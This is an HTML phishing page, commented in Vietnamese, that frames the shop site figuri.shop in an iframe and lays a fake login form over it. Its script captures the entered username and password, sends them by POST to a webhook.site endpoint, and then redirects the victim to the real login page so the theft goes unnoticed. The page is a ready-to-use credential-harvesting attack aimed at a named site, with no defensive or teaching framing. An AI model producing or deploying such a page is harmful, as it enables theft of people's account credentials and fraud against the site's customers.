<!DOCTYPE html>
<html>
  <head>  <iframe src="https://figuri.shop" width="100%" height="800px" style="border: none;"></iframe>
<body>
  <iframe src="https://figuri.shop" width="100%" height="800px" style="border: none;"></iframe>
  <button id="btn-show-login">Đăng nhập</button>

  <div id="login-overlay">
    <form id="fake-login">
      <strong>Đăng nhập tài khoản của bạn</strong>
      <input type="text" id="username" placeholder="Tên đăng nhập" required />
      <input type="password" id="password" placeholder="Mật khẩu" required />
      <button type="submit">Đăng nhập</button>
    </form>
  </div>

  <script>
    const loginOverlay = document.getElementById('login-overlay');
    const btnShow = document.getElementById('btn-show-login');
    const form = document.getElementById('fake-login');

    btnShow.onclick = () => {
      loginOverlay.style.display = 'block';
    };

    form.onsubmit = async (e) => {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Gửi thông tin về webhook của bạn
      await fetch("https://webhook.site/your-webhook-id", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password, timestamp: new Date().toISOString() })
      });

      alert("Đang chuyển hướng đến trang đăng nhập thật...");
      // Redirect đến trang đăng nhập thật (ví dụ: figuri.shop/login)
      window.location.href = "https://figuri.shop/login";
    };
  </script>
  </head>
</body>
</html>
